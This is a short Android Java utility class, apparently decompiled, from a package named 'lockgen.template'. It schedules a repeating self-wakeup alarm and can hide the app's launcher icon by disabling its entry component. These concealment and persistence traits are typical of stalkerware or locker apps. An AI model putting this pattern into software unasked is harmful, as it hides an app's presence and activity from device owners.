package com.lockgen.template.app.core;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public final class KeepAlive {
    public static final String ACTION_TICK = "com.lockgen.template.app.action.KEEP_ALIVE";
    private static final String TAG = "TplKeepAlive";

    private KeepAlive() {
    }

    public static void schedule(Context context, int i) {
        try {
            AlarmManager alarmManager = (AlarmManager) context.getSystemService("alarm");
            if (alarmManager == null) {
                return;
            }
            alarmManager.setInexactRepeating(0, System.currentTimeMillis() + 30000, Math.max(15, i) * 1000, pending(context));
        } catch (Throwable th) {
            Log.w(TAG, "注册自检失败", th);
        }
    }

    public static void cancel(Context context) {
        try {
            AlarmManager alarmManager = (AlarmManager) context.getSystemService("alarm");
            if (alarmManager != null) {
                alarmManager.cancel(pending(context));
            }
        } catch (Throwable unused) {
        }
    }

    private static PendingIntent pending(Context context) {
        Intent intent = new Intent(ACTION_TICK);
        intent.setPackage(context.getPackageName());
        return PendingIntent.getBroadcast(context, 0, intent, 201326592);
    }

    public static void setIconVisible(Context context, boolean z) {
        try {
            context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, context.getPackageName() + ".Entry"), z ? 1 : 2, 1);
        } catch (Throwable th) {
            Log.w(TAG, "图标状态切换失败", th);
        }
    }
}